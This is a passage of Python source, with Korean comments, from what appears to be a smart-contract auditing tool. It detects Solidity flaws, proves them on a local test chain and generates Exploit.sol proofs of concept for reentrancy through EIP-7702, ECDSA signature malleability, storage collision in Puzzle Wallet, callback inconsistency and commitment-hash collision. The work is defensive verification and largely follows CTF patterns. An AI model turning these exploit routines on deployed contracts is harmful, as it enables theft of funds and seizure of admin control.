        iname, ibody = im.group(1), im.group(2)
        fm = re.search(r"function\s+(\w+)\s*\(([^)]*)\)[^;]*\breturns\s*\(\s*bool", ibody)
        if fm:
            cand.append((iname, fm.group(1), fm.group(2).strip()))
    for iname, mname, margs in cand:
        # 타깃이 IName(msg.sender) 를 만들고 mname 을 2회 이상 호출하며 상태 bool 을 세팅?
        if not re.search(re.escape(iname) + r"\s*\(\s*msg\.sender\s*\)", tb):
            continue
        # 진입 함수 f: 본문에 IName(msg.sender) 와 .mname( 2회 이상, 상태 bool 대입 포함
        f = None; boolvar = None
        for fn in _functions(tb):
            b = fn["body"]
            if re.search(re.escape(iname) + r"\s*\(\s*msg\.sender\s*\)", b) \
                    and len(re.findall(r"\.\s*" + re.escape(mname) + r"\s*\(", b)) >= 2:
                am = re.search(r"(\w+)\s*=\s*[\w.]*\.\s*" + re.escape(mname) + r"\s*\(", b)
                if am:
                    f, boolvar = fn["name"], am.group(1); break
        if not f or not boolvar:
            continue
        if _slot_index(tb, boolvar) is None:
            continue
        # attacker: mname 을 호출마다 false→true 로 구현
        def _decls(argstr):
            out = []
            for i, part in enumerate(x.strip() for x in argstr.split(",") if x.strip()):
                ty = part.split()[0]
                mem = " memory" if (ty in ("string", "bytes") or ty.endswith("[]")) else ""
                out.append(f"{ty}{mem} p{i}")
            return ", ".join(out)
        mdecl = _decls(margs)
        _solcv, _evm = _solc_for(target_src)
        std0 = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
                "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
        try:
            c0 = solcx.compile_standard(std0, allow_empty=True)
        except Exception:
            return None
        tabi = None
        for _fl, cs in c0.get("contracts", {}).items():
            for cn, c in cs.items():
                if cn == name: tabi = c["abi"]
        if tabi is None or not _has_getter(tabi, boolvar):
            continue
        ftypes = None
        for e in tabi:
            if e.get("type") == "function" and e.get("name") == f:
                ftypes = [i["type"] for i in e.get("inputs", [])]; break
        if ftypes is None:
            continue
        def _lit(t):
            if t == "address": return "address(this)"
            if t == "bool": return "false"
            if t.startswith("uint") or t.startswith("int"): return "1"
            if re.fullmatch(r"bytes\d+", t): return f"bytes{t[5:]}(0)"
            if t == "bytes": return "hex\"\""
            if t == "string": return "\"\""
            return "0"
        fargs = ", ".join(_lit(t) for t in ftypes)
        pwn_src = (HEADER +
            f"interface IT {{ function {f}({', '.join(ftypes)}) external; }}\n"
            "contract Pwn {\n"
            "    uint256 _c;\n"
            f"    function {mname}({mdecl}) external returns (bool) {{ _c += 1; return (_c % 2) == 0; }}\n"
            f"    function run(address t) external payable {{ IT(t).{f}({fargs}); }}\n"
            "}\n")
        std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
               "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
        try:
            compiled = solcx.compile_standard(std, allow_empty=True)
        except Exception:
            continue
        arts = {}
        for _fl, cs in compiled.get("contracts", {}).items():
            for cn, c in cs.items():
                arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
        if name not in arts or "Pwn" not in arts:
            continue
        abi = arts[name]["abi"]
        w3, acct = _mk_evm()
        def dep(cn, args):
            C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
            r = w3.eth.wait_for_transaction_receipt(C.constructor(*args).transact({"from":acct,"gas":12_000_000}))
            return r.contractAddress
        try:
            taddr = dep(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
            paddr = dep("Pwn", [])
        except Exception:
            continue
        tc = w3.eth.contract(address=taddr, abi=abi)
        try:
            if tc.functions[boolvar]().call() is not False:
                continue  # 이미 true 면 증명 아님
        except Exception:
            continue
        pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
        try:
            pwn.functions.run(taddr).transact({"from":acct,"gas":5_000_000})
        except Exception:
            continue
        if tc.functions[boolvar]().call() is not True:
            continue
        poc = (HEADER +
            "// Strategy: untrusted callback inconsistency (Ethernaut Elevator). The target\n"
            f"// calls {iname}(msg.sender).{mname}(...) twice and trusts both returns. Pwn\n"
            f"// returns false then true, flipping the state flag `{boolvar}`.\n"
            f"interface IT {{ function {f}({', '.join(ftypes)}) external; }}\n"
            "contract Exploit {\n"
            "    uint256 _c;\n"
            f"    function {mname}({mdecl}) external returns (bool) {{ _c += 1; return (_c % 2) == 0; }}\n"
            f"    function run(address t) external payable {{ IT(t).{f}({fargs}); }}\n"
            "    receive() external payable {}\n}\n")
        gen = {"step":"generate","title":"Exploit.sol 생성 (callback-inconsistency)","strategy":"callback-inconsistency","exploit_src":poc}
        return {"name":name,"proven":True,"firstViolated":f"state flag '{boolvar}' flipped via untrusted callback",
                "strategy":f"callback-inconsistency:{f}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
                "note":"외부 콜백을 두 번 신뢰하는 분기를 false→true 반환으로 조작해 상태 플래그를 반전시켰습니다.",
                "ms":int((time.time()-t0)*1000)}
    return None


def _synth_eip7702_reentrancy(name, target_src, invariants_src, manifest, scan_step, t0):
    """EIP-7702 재진입 동적 증명: 수신자 콜백을 mint 이전에 호출하고 `tx.origin==msg.sender`
    EOA 게이트만 있는(그리고 nonReentrant 없는) 경로에서, 코드를 위임받은 EOA(7702)가
    콜백 재진입으로 per-caller 한도(balanceOf==0)를 우회해 2개 이상 민팅함을 실제로 관찰한다.
    py-evm prague + eth_account.sign_authorization 로 type-4 트랜잭션을 보낸다.
    (타깃이 컴파일되지 않으면 — 예: 외부 import 미해결 — None; 그 경우 정적 휴리스틱이 보고한다.)"""
    import solcx
    from web3 import Web3
    from eth_account import Account
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    # 수신자 콜백(mint 이전) 흔적
    if not re.search(r"|".join(_RECEIVER_HOOKS), tb) and not re.search(r"encodeWithSignature\s*\(\s*\"(\w+)\(", tb):
        return None
    # EOA 게이트(tx.origin==msg.sender) + nonReentrant 없는 무인자 external 진입점
    entry = None
    for fn in _functions(tb):
        if fn["external"] and not fn["args"] and "nonReentrant" not in fn["head"] \
                and re.search(r"tx\.origin\s*==\s*msg\.sender|msg\.sender\s*==\s*tx\.origin", fn["body"]):
            entry = fn["name"]; break
    if not entry:
        return None
    # 콜백 시그니처/구현 결정
    cbimpl = None
    em = re.search(r"encodeWithSignature\s*\(\s*\"(\w+)\(([^\"]*)\)\"", tb)
    if re.search(r"checkOnERC721Received|onERC721Received", tb):
        cbimpl = ("function onERC721Received(address,address,uint256,bytes calldata) external "
                  "returns (bytes4) { _reenter(); return 0x150b7a02; }")
    elif re.search(r"onERC1155Received", tb):
        cbimpl = ("function onERC1155Received(address,address,uint256,uint256,bytes calldata) external "
                  "returns (bytes4) { _reenter(); return 0xf23a6e61; }")
    elif em:
        cbname = em.group(1); cbargs = em.group(2).strip()
        params = ", ".join(f"{a.strip()} p{i}" for i, a in enumerate(cbargs.split(",")) if a.strip())
        cbimpl = f"function {cbname}({params}) external {{ _reenter(); }}"
    else:
        return None
    # balanceOf(address) 게터로 per-caller 카운트를 관찰(없으면 이 경로 보류)
    _solcv, _evm = _solc_for(target_src)
    dele = (HEADER +
        f"interface IT {{ function {entry}() external; }}\n"
        "contract Delegate {\n"
        "    bool entered;\n"
        "    function _reenter() internal { if (!entered) { entered = true; "
        f"IT(msg.sender).{entry}(); }} }}\n"
        f"    {cbimpl}\n"
        "}\n")
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Delegate.sol":{"content":dele}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try:
        compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception:
        return None   # 컴파일 실패(외부 import 등) → 정적 휴리스틱이 처리
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts or "Delegate" not in arts:
        return None
    abi = arts[name]["abi"]
    bal_of = any(e.get("type")=="function" and e.get("name")=="balanceOf"
                 and [i["type"] for i in e.get("inputs",[])]==["address"] for e in abi)
    if not bal_of:
        return None
    w3, acct = _mk_evm()
    try:
        backend = w3.provider.ethereum_tester.backend
        keys = backend.account_keys
    except Exception:
        return None
    accts = list(w3.eth.accounts)
    if len(accts) < 3:
        return None
    deployer = accts[0]; attacker = accts[1]; atk_key = keys[1]
    def deploy(cn):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        r = w3.eth.wait_for_transaction_receipt(C.constructor().transact({"from":deployer,"gas":9_000_000}))
        return r.contractAddress
    try:
        taddr = deploy(name); daddr = deploy("Delegate")
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    try:
        b0 = int(tc.functions.balanceOf(attacker).call())
    except Exception:
        return None
    cid = w3.eth.chain_id
    nonce = w3.eth.get_transaction_count(attacker)
    try:
        # authority == tx sender → 인증 nonce = tx nonce + 1
        auth = Account.sign_authorization({"chainId":cid,"address":daddr,"nonce":nonce+1}, atk_key)
        sel = Web3.keccak(text=f"{entry}()")[:4]
        tx = {"chainId":cid,"to":taddr,"value":0,"gas":3_000_000,
              "maxFeePerGas":10**11,"maxPriorityFeePerGas":10**9,"nonce":nonce,
              "data":sel,"authorizationList":[auth]}
        signed = Account.sign_transaction(tx, atk_key)
        rc = w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(signed.raw_transaction))
        if int(rc.status) != 1:
            return None
    except Exception:
        return None
    b1 = int(tc.functions.balanceOf(attacker).call())
    if not (b1 > 1 and b1 > b0):     # 유일성/한도(≤1) 위반을 실제 관찰
        return None
    poc = (HEADER +
        "// Strategy: EIP-7702 reentrancy. The mint runs a receiver callback BEFORE committing\n"
        "// state, and the free path is gated only by tx.origin==msg.sender. A 7702-delegated\n"
        "// EOA satisfies that gate yet has code, so the callback re-enters the unguarded mint\n"
        "// while balanceOf is still 0, minting past the per-address limit.\n"
        "// (Attacker signs an EIP-7702 authorization to the Delegate below, then sends a\n"
        "//  type-4 SetCode tx calling " + entry + "().)\n"
        f"interface IT {{ function {entry}() external; }}\n"
        "contract Delegate {\n"
        "    bool entered;\n"
        f"    function _reenter() internal {{ if (!entered) {{ entered = true; IT(msg.sender).{entry}(); }} }}\n"
        f"    {cbimpl}\n"
        "}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (eip7702-reentrancy)","strategy":"eip7702-reentrancy","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"per-address uniqueness broken (balanceOf → {b1})",
            "strategy":f"eip7702-reentrancy:{entry}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"EIP-7702 로 코드를 위임받은 EOA 가 mint 이전 콜백으로 재진입해 per-caller 한도를 우회, 2개 이상 민팅했습니다(type-4 트랜잭션 실제 실행).",
            "ms":int((time.time()-t0)*1000)}


def _synth_commitment_collision(name, target_src, invariants_src, manifest, scan_step, t0):
    """커밋먼트 해시 off-by-one 동적 증명(NotOptimisticPortal 류): keccak 누산 루프가
    `arr.length - 1` 까지만 돌아 배열의 마지막 원소를 커밋에 바인딩하지 않는 public/external
    함수를, 마지막 원소만 다른 두 입력으로 호출해 '같은 슬롯'이 나오는 충돌을 관찰한다.
    올바른 구현(length 까지)이라면 서로 달라야 하므로, 충돌 자체가 위·변조/리플레이 증거."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    # off-by-one keccak 누산 루프를 가진 함수 후보
    cand = None
    for fn in _functions(tb):
        if re.search(r"for\s*\([^;]*;\s*\w+\s*<\s*\w+\s*\.\s*length\s*-\s*1\s*;", fn["body"]) \
                and "keccak256" in fn["body"] and (fn["external"] or "public" in fn["head"]):
            cand = fn["name"]; break
    if not cand:
        return None
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts:
        return None
    abi = arts[name]["abi"]
    fabi = None
    for e in abi:
        if e.get("type") == "function" and e.get("name") == cand \
                and [o["type"] for o in e.get("outputs", [])] == ["bytes32"] \
                and any(i["type"].endswith("[]") for i in e.get("inputs", [])):
            fabi = e; break
    if fabi is None:
        return None
    types = [i["type"] for i in fabi["inputs"]]
    A1 = "0x000000000000000000000000000000000000AA01"
    A2 = "0x000000000000000000000000000000000000AA02"
    A3 = "0x000000000000000000000000000000000000AA03"
    d0 = bytes.fromhex("3a69197e") + b"\x00"*4
    d1 = bytes.fromhex("3a69197e") + b"\x11"*4
    d2 = bytes.fromhex("3a69197e") + b"\x22"*4
    def build(last_variant):
        args = []
        for tI in types:
            if tI == "address[]":
                args.append([Web3.to_checksum_address(A1), Web3.to_checksum_address(A2 if last_variant == 0 else A3)])
            elif tI == "bytes[]":
                args.append([d0, d1 if last_variant == 0 else d2])
            elif tI == "address": args.append(Web3.to_checksum_address(_default_for_type("address")))
            elif tI.startswith("uint") or tI.startswith("int"): args.append(1)
            elif tI == "bytes32": args.append(b"\x00"*32)
            elif tI == "bytes": args.append(d0)
            elif tI == "bool": args.append(False)
            elif tI == "string": args.append("x")
            else: return None
        return args
    argsA = build(0); argsB = build(1)
    if argsA is None or argsB is None:
        return None
    w3, acct = _mk_evm()
    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
    try:
        taddr = w3.eth.wait_for_transaction_receipt(
            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":acct,"gas":4_000_000})).contractAddress
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    try:
        sA = tc.functions[cand](*argsA).call()
        sB = tc.functions[cand](*argsB).call()
    except Exception:
        return None
    if sA != sB:
        return None   # 마지막 원소가 바인딩됨 → 안전(오탐 아님)
    poc = (HEADER +
        "// Strategy: commitment collision (off-by-one). The message-slot hash loops to\n"
        f"// `length - 1`, so two message sets differing only in the LAST element produce the\n"
        f"// SAME slot via {cand}() — the replay/proof key does not bind what actually executes.\n"
        f"interface IC {{ function {cand}(" + ",".join(types) + ") external pure returns (bytes32); }}\n"
        "contract Exploit {\n"
        "    // proof-of-collision: slot(setA) == slot(setB) though the last element differs;\n"
        "    // executeMessage then runs the attacker's uncommitted last operation.\n"
        "}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (commitment-collision)","strategy":"commitment-collision","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"commitment collision via {cand} (last array element unbound)",
            "strategy":f"commitment-collision:{cand}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"마지막 원소만 다른 두 메시지가 같은 커밋 슬롯으로 충돌합니다 — 리플레이/증명 키가 실제 실행 내용을 바인딩하지 못해 위·변조가 가능합니다(off-by-one).",
            "ms":int((time.time()-t0)*1000)}


def _synth_magic_carousel(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Magic Animal Carousel 류: 패킹 슬롯(owner|nextId|animal)에서 changeAnimal 이
    `encodedAnimal << 160` 로 동물 이름을 쓰면서 nextId 영역(bits 160-175)을 보존한다고
    (`& NEXT_ID_MASK`) 주장하지만, 이름의 하위 바이트가 그 영역으로 흘러들어 링 포인터를
    공격자 임의값으로 오염시킨다. 보존돼야 할 nextId 가 이름 입력만으로 바뀌는지로 증명한다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    if not (re.search(r"function\s+setAnimalAndSpin", tb) and re.search(r"function\s+changeAnimal", tb)
            and re.search(r"function\s+encodeAnimalName", tb) and re.search(r"\bcarousel\b", tb)):
        return None
    sm = re.search(r"NEXT_ID_MASK\s*=\s*uint256\(type\(uint16\)\.max\)\s*<<\s*(\d+)", tb)
    shift = int(sm.group(1)) if sm else 160
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts:
        return None
    abi = arts[name]["abi"]
    has_carousel = any(e.get("type")=="function" and e.get("name")=="carousel"
                       and [i["type"] for i in e.get("inputs",[])]==["uint256"] for e in abi)
    if not has_carousel:
        return None
    w3, acct = _mk_evm()
    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
    try:
        taddr = w3.eth.wait_for_transaction_receipt(
            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":acct,"gas":3_000_000})).contractAddress
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    def nextid(cid):
        return (int(tc.functions.carousel(cid).call()) >> shift) & 0xFFFF
    def ok(h):
        try: return int(w3.eth.wait_for_transaction_receipt(h).status) == 1
        except Exception: return False
    try:
        if not ok(tc.functions.setAnimalAndSpin("cat").transact({"from":acct,"gas":400_000})):
            return None
        cur = int(tc.functions.currentCrateId().call()) if _has_getter(abi, "currentCrateId") else 1
        n0 = nextid(cur)
        # 12자 ASCII: 하위 2바이트(index 10,11)가 nextId 영역으로 흘러든다
        if not ok(tc.functions.changeAnimal("AAAAAAAAAABC", cur).transact({"from":acct,"gas":400_000})):
            return None
        n1 = nextid(cur)
    except Exception:
        return None
    if n1 == n0:
        return None
    poc = (HEADER.replace(">=0.6.2", "^0.8.28") +
        "// Strategy: Magic Animal Carousel. changeAnimal writes encodedAnimal<<160, so the\n"
        "// name's low bytes bleed into the nextId field (bits 160-175) that the code claims\n"
        "// to preserve — corrupting the carousel ring pointer to an attacker-chosen value.\n"
        f"interface IC {{ function setAnimalAndSpin(string calldata) external; function changeAnimal(string calldata, uint256) external; function currentCrateId() external view returns (uint256); }}\n"
        "contract Exploit {\n"
        "    function run(address t) external {\n"
        "        IC(t).setAnimalAndSpin(\"cat\");\n"
        "        uint256 cur = IC(t).currentCrateId();\n"
        "        IC(t).changeAnimal(\"AAAAAAAAAABC\", cur);  // low bytes B,C bleed into nextId\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (magic-carousel)","strategy":"magic-carousel","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"carousel ring pointer corrupted (nextId {n0} → {n1} via animal-name bleed)",
            "strategy":"magic-carousel:changeAnimal","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"changeAnimal 의 encodedAnimal<<160 이 보존돼야 할 nextId 필드로 이름 바이트를 흘려보내 링 포인터를 임의값으로 오염시켰습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_ecdsa_malleability(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Impersonator 류: ecrecover 로 권한(controller)을 확인하면서 소모 서명을
    정확한 (v,r,s) 로만 표시하고 s 정규화가 없다. 같은 서명자를 복구하는 대칭 서명
    (v^1, r, N-s)으로 changeController 를 호출해 controller 를 탈취한다."""
    import solcx
    from web3 import Web3
    from eth_account import Account
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    if "ecrecover" not in tb:
        return None
    # 역할 변경 함수: (uint8, bytes32, bytes32, address) 를 받아 role = <address arg>
    changer = None; role = None; addr_arg = None
    for fn in _functions(tb):
        ts = [a[0] for a in fn["args"]]
        if fn["external"] and ts[:3] == ["uint8", "bytes32", "bytes32"] and "address" in ts:
            an = fn["args"][ts.index("address")][1]
            mm = re.search(r"(\w+)\s*=\s*" + re.escape(an), fn["body"])
            if mm:
                changer, role, addr_arg = fn["name"], mm.group(1), an; break
    if not changer or not role:
        return None
    # s 정규화가 있으면(안전) 스킵 신호이나, 동적 검증이 최종 판정이므로 그대로 진행
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts:
        return None
    abi = arts[name]["abi"]
    if not _has_getter(abi, role):
        return None
    ctypes = _abi_ctor_types(abi)
    if "uint8" not in ctypes or ctypes.count("bytes32") < 3:
        return None
    w3, acct = _mk_evm()
    ck = Account.create()
    msgHash = Web3.keccak(text="trust404-lock")
    sig = Account.unsafe_sign_hash(msgHash, ck.key)
    v, r, s = sig.v, sig.r, sig.s
    # 생성자 인자: uint8=v, 그 앞 bytes32=msgHash, 그 뒤 두 bytes32=r,s, uint256=1
    vi = ctypes.index("uint8")
    cargs = []
    seen_after_v = 0; before_v_bytes32 = None
    # 먼저 v 앞 마지막 bytes32 인덱스 찾기
    for i in range(vi):
        if ctypes[i] == "bytes32": before_v_bytes32 = i
    b32_after = [i for i in range(vi+1, len(ctypes)) if ctypes[i] == "bytes32"]
    for i, tI in enumerate(ctypes):
        if i == vi: cargs.append(v)
        elif i == before_v_bytes32: cargs.append(msgHash)
        elif len(b32_after) >= 2 and i == b32_after[0]: cargs.append(r.to_bytes(32,"big"))
        elif len(b32_after) >= 2 and i == b32_after[1]: cargs.append(s.to_bytes(32,"big"))
        elif tI.startswith("uint"): cargs.append(1)
        elif tI == "bytes32": cargs.append(msgHash)
        else: cargs.append(_default_for_type(tI))
    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
    try:
        taddr = w3.eth.wait_for_transaction_receipt(
            C.constructor(*cargs).transact({"from":w3.eth.accounts[1],"gas":3_000_000})).contractAddress
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    c0 = tc.functions[role]().call()
    if int(c0, 16) != int(ck.address, 16):   # 서명자가 controller 로 설정됐는지 확인(배선 성공)
        return None
    N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    s2 = N - s; v2 = 27 if v == 28 else 28
    # changeController(v2, r, s2, attacker) — 인자 순서대로 채움
    call_args = []
    ai = 0
    for tI in [a[0] for a in next(f for f in _functions(tb) if f["name"]==changer)["args"]]:
        if tI == "uint8": call_args.append(v2)
        elif tI == "bytes32": call_args.append((r.to_bytes(32,"big") if ai==0 else s2.to_bytes(32,"big"))); ai += 1
        elif tI == "address": call_args.append(Web3.to_checksum_address(acct))
        else: call_args.append(_default_for_type(tI))
    try:
        getattr(tc.functions, changer)(*call_args).transact({"from":acct,"gas":400_000})
    except Exception:
        return None
    c1 = tc.functions[role]().call()
    if int(c1, 16) != int(acct, 16):
        return None
    poc = (HEADER +
        "// Strategy: ECDSA malleability (Ethernaut Impersonator). usedSignatures marks only\n"
        "// the exact (v,r,s), and s is not normalized, so the symmetric signature\n"
        "// (v^1, r, N-s) recovers the same signer yet counts as unused —\n"
        f"// call {changer}(v', r, N-s, attacker) to seize `{role}`.\n"
        f"interface IT {{ function {changer}(uint8,bytes32,bytes32,address) external; }}\n"
        "contract Exploit {\n"
        "    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;\n"
        "    function run(address t, uint8 v, bytes32 r, bytes32 s) external {\n"
        "        uint8 v2 = v == 28 ? 27 : 28;\n"
        "        bytes32 s2 = bytes32(N - uint256(s));\n"
        f"        IT(t).{changer}(v2, r, s2, msg.sender);\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (ecdsa-malleability)","strategy":"ecdsa-malleability","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"{role} hijacked via ECDSA signature malleability",
            "strategy":f"ecdsa-malleability:{changer}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"소모 서명을 정확한 (v,r,s) 로만 표시하고 s 정규화가 없어, 대칭 서명(v^1,r,N-s)으로 controller 를 탈취했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_puzzle_wallet(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Puzzle Wallet 류: 프록시(pendingAdmin/admin)와 월렛(owner/maxBalance)의
    스토리지 충돌 + multicall 예치 중복. proposeNewAdmin 으로 owner 선점 → 화이트리스트 →
    중첩 multicall 로 예치 2배 계상 → execute 로 잔액 소진 → setMaxBalance 로 admin 탈취.
    프록시의 admin() 이 공격자로 바뀌는지로 증명한다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    # 이 컨트랙트가 프록시여야(proposeNewAdmin + admin) 하고, 형제 월렛(multicall+setMaxBalance)이 있어야
    if not (re.search(r"function\s+proposeNewAdmin", tb) and re.search(r"\badmin\b", tb)):
        return None
    wallet = None
    for cn, b in bodies.items():
        if cn != name and re.search(r"function\s+multicall\s*\(\s*bytes", b) and re.search(r"function\s+setMaxBalance", b):
            wallet = cn; break
    if not wallet:
        return None
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts or wallet not in arts:
        return None
    w3, acct = _mk_evm()
    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts) > 1 else acct
    attacker = acct
    def dep(cn, args, frm, value=0):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":frm,"value":value,"gas":6_000_000})).contractAddress
    try:
        wimpl_addr = dep(wallet, [], deployer)
        wimpl = w3.eth.contract(abi=arts[wallet]["abi"], bytecode=arts[wallet]["bin"])
        initdata = bytes.fromhex(wimpl.encode_abi("init", [10**16])[2:])
        # 프록시 생성자: (address _admin, address _impl, bytes _initData) — 첫 addr=admin, 둘째 addr=impl
        ptypes = _abi_ctor_types(arts[name]["abi"])
        cargs = []; addr_i = 0
        for tI in ptypes:
            if tI == "address":
                cargs.append(Web3.to_checksum_address(deployer if addr_i == 0 else wimpl_addr)); addr_i += 1
            elif tI == "bytes":
                cargs.append(initdata)
            else:
                cargs.append(_default_for_type(tI))
        proxy = dep(name, cargs, deployer)
    except Exception:
        return None
    # 레벨 셋업 자금(0.001 ETH) 시드
    try: w3.eth.send_transaction({"from":accts[-1],"to":proxy,"value":10**15,"gas":120000})
    except Exception: pass
    proxyC = w3.eth.contract(address=proxy, abi=arts[name]["abi"])
    wal = w3.eth.contract(address=proxy, abi=arts[wallet]["abi"])
    if not _has_getter(arts[name]["abi"], "admin"):
        return None
    a0 = proxyC.functions.admin().call()
    try:
        proxyC.functions.proposeNewAdmin(Web3.to_checksum_address(attacker)).transact({"from":attacker,"gas":200000})
        wal.functions.addToWhitelist(Web3.to_checksum_address(attacker)).transact({"from":attacker,"gas":200000})
        dep_data = bytes.fromhex(wal.encode_abi("deposit", [])[2:])
        inner = bytes.fromhex(wal.encode_abi("multicall", [[dep_data]])[2:])
        wal.functions.multicall([dep_data, inner]).transact({"from":attacker,"value":10**15,"gas":1_000_000})
        wal.functions.execute(Web3.to_checksum_address(attacker), 2*10**15, b"").transact({"from":attacker,"gas":1_000_000})
        wal.functions.setMaxBalance(int(attacker, 16)).transact({"from":attacker,"gas":300000})
    except Exception:
        return None
    a1 = proxyC.functions.admin().call()
    if a1 == a0 or int(a1, 16) != int(attacker, 16):
        return None
    poc = (HEADER +
        "// Strategy: Puzzle Wallet. Proxy(pendingAdmin/admin) collides with wallet(owner/\n"
        "// maxBalance). proposeNewAdmin -> become owner; whitelist; nested multicall double-\n"
        "// counts one deposit; execute drains to 0; setMaxBalance writes slot1 => admin.\n"
        "interface IProxy { function proposeNewAdmin(address) external; function admin() external view returns (address); }\n"
        "interface IWallet { function addToWhitelist(address) external; function deposit() external payable;\n"
        "    function multicall(bytes[] calldata) external payable; function execute(address,uint256,bytes calldata) external;\n"
        "    function setMaxBalance(uint256) external; }\n"
        "contract Exploit {\n"
        "    function run(address payable proxy) external payable {\n"
        "        IProxy(proxy).proposeNewAdmin(address(this));\n"
        "        IWallet(proxy).addToWhitelist(address(this));\n"
        "        bytes[] memory inner = new bytes[](1); inner[0] = abi.encodeWithSignature(\"deposit()\");\n"
        "        bytes[] memory outer = new bytes[](2);\n"
        "        outer[0] = abi.encodeWithSignature(\"deposit()\");\n"
        "        outer[1] = abi.encodeWithSignature(\"multicall(bytes[])\", inner);\n"
        "        IWallet(proxy).multicall{value: msg.value}(outer);\n"
        "        IWallet(proxy).execute(address(this), msg.value * 2, \"\");\n"
